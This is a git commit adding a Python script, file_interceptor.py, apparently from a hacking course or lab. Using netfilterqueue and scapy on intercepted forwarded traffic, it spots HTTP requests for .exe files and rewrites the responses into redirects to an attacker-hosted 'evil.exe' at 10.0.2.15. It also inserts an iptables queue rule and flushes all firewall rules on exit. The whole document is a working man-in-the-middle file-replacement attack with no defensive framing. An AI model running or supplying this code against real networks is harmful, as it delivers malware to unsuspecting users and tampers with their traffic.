784230d919e14799869be51b5cd3bcb9c9a0b596
root <root@localhost.localdomain>
2019-05-18 15:18:06 -0700

    FI

---
+++ Attacks/file_interceptor.py
@@ -0,0 +1,43 @@
+#!/usr/bin/env python
+
+import netfilterqueue
+import scapy.all as scapy
+import subprocess
+
+ack_list = []
+
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+    
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.15" not in scapy_packet[scapy.Raw].load:
+                print("[+] exe Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file.")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved permanently\nLocation: http://10.0.2.15/evil.exe\n\n")
+                
+                packet.set_payload(str(modified_packet))
+
+    packet.accept()
+
+try:
+    subprocess.call("iptables -I  FORWARD -j NFQUEUE --queue-num 0", shell=True)
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
+except(KeyboardInterrupt):
+    subprocess.call("iptables --flush", shell=True)
+    print("\n\n[+] IP Tables flushed")
